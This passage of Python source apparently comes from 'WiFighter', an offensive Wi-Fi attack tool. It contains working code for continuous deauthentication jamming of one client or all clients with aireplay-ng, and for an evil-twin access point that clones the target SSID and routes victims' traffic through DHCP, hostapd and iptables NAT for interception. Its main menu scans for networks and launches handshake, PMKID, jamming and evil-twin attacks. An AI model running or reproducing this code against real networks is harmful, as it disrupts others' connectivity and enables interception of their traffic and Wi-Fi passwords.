                                   print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
                                   generate_report('PMKID Attack', target_ap, password, target, output_dir)
          except KeyboardInterrupt:
               pass
     
     if not password or not wordlist:
          print(f"\n{CYAN}[>]{RESET} Password not found...")
          if file_num:
               print(f"{YELLOW}[>]{RESET} PMKID hash available for offline cracking (use hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/pmkid_hash-{file_num}")
          else:
               print(f"{YELLOW}[>]{RESET} PMKID hash available for offline cracking (use hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/pmkid_hash")


# | Jamming | #

def jam_network(target_ap, interface, jammer_mode): 
     global sniffed_clients

     # Prepare variables
     ssid = target_ap['SSID'] if target_ap['SSID'] else None
     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
     target = ssid if ssid else bssid # Set target by checking if SSID set
     jammer_mode = jammer_mode.lower()
     target_client = None


     # Set deauth client if attack mode "Client deauth"
     if jammer_mode == 'client jamming':
          logo()
          while True:
               sniff_result, interrupted = sniff_clients(interface, bssid, target) # Get available AP's
               if not interrupted:
                    sniffed_clients = sniff_result # Set sniffed clients list only when the sniff wasn't ended earlier with ctrl + c (only on natural end of each sniff scanning)
               logo()
               list_clients(sniffed_clients, ssid, bssid) # Show the sniff results periodically in table
               if interrupted: # Break the while cycle when Keyboardinterrupt is caught in the sniff function
                    break

          # Let user choose client as target
          if sniffed_clients:
               try:
                    target_client = choose_target_client(sniffed_clients)
               except:
                    pass

     def run_aireplay(interface, bssid, target, target_client, jammer_mode):
          loading_message = None
          if jammer_mode == 'client jamming':
               loading_message = f"Jamming {target_client} on {target}... ( Press [Ctrl + C] to stop )"
          if jammer_mode == 'broadcast jamming':
               loading_message = f"Jamming all clients on {target}... ( Press [Ctrl + C] to stop )"
          loading = multiprocessing.Process(target=loading_animation, args=(str(loading_message),))
          loading.start() # Run loading animation while sniff_clients function runs
          
          if interface and bssid and jammer_mode:
               if jammer_mode == "client jamming":
                    if target_client:
                         try:
                              # Continuosly deauth client
                              command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', target_client, interface]
                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         except:
                              pass
                    else:
                         print(f'{RED}No target client set! Skipping...{RESET}')
               elif jammer_mode == "broadcast jamming":
                    try:
                         # Continuosly deauth deauth all clients
                         command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                         pass
               else:
                    pass

          loading.terminate() # End the loading animation
     
     # Define process
     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target, target_client, jammer_mode))

     logo()
     print(f'{CYAN}| Jamming |{RESET}\n')
     # Run aireplay-ng
     deauth_clients.start()
     deauth_clients.join()



def choose_evil_interfaces(detected_interfaces):
     print(f"Select Interfaces:\n")

     for idx, interface in enumerate(detected_interfaces, start=1):
          print(f"{idx}. {interface}")

     print()

     def select_interface(prompt):
          while True:
               try:
                    choice = int(input(f"{prompt}: ")) - 1
                    if 0 <= choice < len(detected_interfaces):
                         return detected_interfaces[choice]
                    else:
                         print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")

     evil_interface = select_interface("Wireless interface number for fake AP")
     internet_interface = select_interface("Internet interface number")

     return evil_interface, internet_interface

# | Evil Twin | #
def evil_twin(target_ap, interface, target):
     # Prepare variables
     ssid = target_ap['SSID'] if target_ap['SSID'] else None

     if ssid:
          detected_interfaces = []

          print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")

          try:
               # Run 'ip -o link show' to get interface details
               result = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, check=True)

               # Extract interface names using regex
               detected_interfaces = [iface for iface in re.findall(r'^\d+: ([^:]+):', result.stdout, re.MULTILINE) if iface != "lo"]
          except subprocess.CalledProcessError as e:
               print(f"{RED}Error executing 'ip -o link show': {e}{RESET}")

          if detected_interfaces:
               if len(detected_interfaces) > 1:
                    evil_interface, internet_interface = choose_evil_interfaces(detected_interfaces)
               else:
                    print(f"{RED}You need atleast 2 network interfaces to run this attack!{RESET}")

          if evil_interface and internet_interface:
               logo()
               print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
               #print(evil_interface)
               #print(internet_interface)

               def run_command(command):
                    try:
                         subprocess.run(command, shell=True, check=True)
                    except subprocess.CalledProcessError as e:
                         print(f"Error running command: {e}")
                    
               # Step 1: Configure DHCP Server's Interface
               dhcpd_config_file = "/etc/sysconfig/dhcpd"
               with open(dhcpd_config_file, "a") as f:
                    f.write(f'DHCPD_INTERFACE="{evil_interface}"\n')
               print("DHCPD_INTERFACE set.")

               # Step 2: Configure DHCP Server's Settings
               dhcpd_conf_file = "/etc/dhcpd.conf"
               with open(dhcpd_conf_file, "w") as f:
                    f.write("""
option domain-name "local";
option domain-name-servers 8.8.8.8, 8.8.4.4;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.100.0 netmask 255.255.255.0 {
range 192.168.100.2 192.168.100.254;
option subnet-mask 255.255.255.0;
option routers 192.168.100.1;
option broadcast-address 192.168.100.255;
}
               """)
               print("DHCPD configuration set.")

               # Step 3: Configure Evil AP's Settings
               hostapd_conf_file = "/etc/hostapd.conf"
               with open(hostapd_conf_file, "w") as f:
                    f.write(f"""
interface={evil_interface}
driver=nl80211
ssid={ssid}
channel=1
hw_mode=g
ieee80211n=1
wme_enabled=1
macaddr_acl=0
auth_algs=1
rsn_pairwise=CCMP
               """)
               print("Hostapd configuration set.")

               # Step 4: Set up the Evil AP's Interface
               run_command(f"sudo ip addr add 192.168.100.1/24 dev {evil_interface}")
               print(f"Evil AP interface {evil_interface} configured.")

               # Step 5: Enable Internet Connection for Clients
               run_command(f"sudo iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o {internet_interface} -j MASQUERADE")
               run_command(f"sudo iptables -A FORWARD -i {evil_interface} -o {internet_interface} -j ACCEPT")
               run_command(f"sudo iptables -A FORWARD -i {internet_interface} -o {evil_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT")
               run_command("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
               print("IP forwarding enabled.")

               # Step 6: Prevent NetworkManager from managing the Evil AP's interface
               run_command(f"sudo nmcli dev set {evil_interface} managed no")
               print(f"NetworkManager disabled for interface {evil_interface}.")

               # Step 7: Restart Services to Apply Configuration
               run_command("systemctl restart dhcpd")
               run_command("systemctl restart hostapd")
               print("DHCPD and Hostapd services restarted.")

               print("Evil AP setup completed successfully.")

     else:
          print(f"{RED}Target AP doesn't have SSID set!{RESET}")

#------------------------------------------------------------------------------------


# | CODE | #

cmd_lenght = len(sys.argv)

# Subcommands catch
if cmd_lenght > 1:
     if cmd_lenght == 2:
          command = sys.argv[1].lower()
          if command == "list":
               list_interfaces()
               print()
          elif command == "wake":
               start_services('verbose')
               print()
          elif command == "kill":
               stop_services('verbose')
               print()
          else:
               print(f'{RED}Invalid Command! Type "wifighter [start/stop/status/list/wake/kill] (-INTERFACE_NAME-)"\n{RESET}')
          
     elif cmd_lenght >= 3:
          command = sys.argv[1].lower()
          interface = sys.argv[2]
          channel = None

          # Handle listen subcommand - set NIC for listenning to specific channel 
          if cmd_lenght > 3:
               if sys.argv[3].lower() == 'listen' and cmd_lenght == 5:
                    channel = sys.argv[4]
               else:
                    print(f'{RED}Invalid Command! Type "wifighter start (-INTERFACE_NAME-) listen (-CHANNEL_NUMBER-)"\n{RESET}')
                    sys.exit()

          if command == "start" or command == "stop": # Interface mode switch function
               monitor_switch('verbose', command, interface, channel)
               print()
          elif command == "status": # Show interface mode status
               mode = interface_mode(interface)
               if mode:
                    print(f'{CYAN}Interface {interface} is {mode}\n{RESET}')
               else:
                    print(f'{RED}Interface "{interface}" does not exist! Type "wifighter [start/stop/status] (-INTERFACE_NAME-)"\n{RESET}')
          else:
               print(f'{RED}Invalid Command! Type "wifighter [start/stop/status] (-INTERFACE_NAME-)"\n{RESET}')
     else:
          print(f'{RED}Invalid Command! Type "wifighter [start/stop/status] (-INTERFACE_NAME-)"\n{RESET}')
else:
     # | WIFIGHTER TOOL |

     introduction()
     interface = choose_interface() # Choose scanning/attacking interface

     # Scan and choose target AP
     if interface:
          try:
               monitor_switch(None, 'stop', interface, None) # Make sure interface is in Managed
               start_services(None) # Make sure network services are running
          except KeyboardInterrupt:
               pass
          try:
               while True:
                    # Get available AP's
                    scan_output = scan_ap(interface) # Get output array from iw
                    if scan_output and isinstance(scan_output, list):
                         wifi_networks = scan_output 
                    if wifi_networks:
                         logo()
                         list_ap(wifi_networks) # Show available AP's in table
                    time.sleep(1) # Wait before each scan
          except KeyboardInterrupt:
               if wifi_networks:
                    target_ap = choose_target() # Let user choose AP as target
               else:
                    print(f"\n\n{RED}No AP's found!{RESET}")

     # List attack possibilities
     if target_ap:
          if target_ap['BSSID'] and target_ap['Channel']:
               logo()
               attack = choose_attack(target_ap)
          else:
               print(f"\n\n{RED}Selected AP is missing mandatory parameters!{RESET}")
     
     # Run attacks
     if attack:
          try:
               monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
          except KeyboardInterrupt:
               pass
          try:
               time.sleep(2)
          except KeyboardInterrupt:
               pass
          target = target_ap['SSID'] if target_ap['SSID'] else target_ap['BSSID'] # Set target by checking if SSID set
          logo()
          if attack == 'Handshake Crack':
               deauth_mode = choose_deauth_mode()
               if deauth_mode:
                    try:
                         handshake_crack(target_ap, interface, deauth_mode, target) # Start attack
                    except KeyboardInterrupt:
                         if output_dir and output_file and delete_capture:
                              file_keyword = output_file.split('.')[0]
                              os.system(f'sudo rm {output_dir}/{file_keyword}*') # Delete all cap files created with airodump if handshake not captured

          elif attack == 'PMKID Attack':
               try:
                    pmkid_attack(target_ap, interface, target)
               except:
                    if output_dir and output_file and delete_capture:
                         try:
                              file_num = output_file.split('-')[1]
                         except:
                              file_num = None
                         if file_num:
                              os.system(f'sudo rm {output_dir}/pmkid*-{file_num}*') # Delete all files created with hcxtools if PMKID not captured
                         else:
                              # Delete all files without number created with hcxtools if PMKID not captured
                              if os.path.exists(f'{output_dir}/pmkid_capture.pcapng'):
                                   os.system(f'sudo rm {output_dir}/pmkid_capture.pcapng') 
                              if os.path.exists(f'{output_dir}/pmkid_hash'):
                                   os.system(f'sudo rm {output_dir}/pmkid_hash') 
                              if os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
                                   os.system(f'sudo rm {output_dir}/pmkid_cracked.txt') 
          elif attack == 'Jamming':
               jammer_mode = choose_jammer_mode()
               if jammer_mode:
                    try:
                         jam_network(target_ap, interface, jammer_mode) # Start attack
                    except KeyboardInterrupt:
                         pass

          elif attack == 'Evil Twin':
               try:
                    evil_twin(target_ap, interface, target)
               except KeyboardInterrupt:
                    pass


     # On tool end turn everything back on
     print(f"\n\n{BLUE}Exiting the tool...{RESET}")
     if interface:
          try:
               monitor_switch('verbose', 'stop', interface, None)
          except:
               pass
     